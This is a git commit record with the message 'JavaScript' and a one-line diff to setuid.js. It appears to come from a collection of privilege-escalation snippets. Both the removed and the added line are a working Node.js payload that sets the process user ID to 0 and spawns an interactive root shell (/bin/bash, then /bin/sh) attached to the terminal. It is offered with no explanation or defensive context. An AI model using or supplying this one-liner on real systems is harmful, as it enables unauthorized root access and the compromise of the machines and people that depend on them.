2abbab13a575f43ffe92059af7515fe63425c558
Julio Machado <94451745+jm0x0@users.noreply.github.com>
2021-11-24 19:13:56 +0000

    JavaScript
    JavaScript

--- setuid.js
+++ setuid.js
@@ -1,1 +1,1 @@
-const child_process = require('child_process'); process.setuid(0); child_process.spawn("/bin/bash", {stdio: [0, 1, 2]})
+const child_process = require('child_process'); process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})
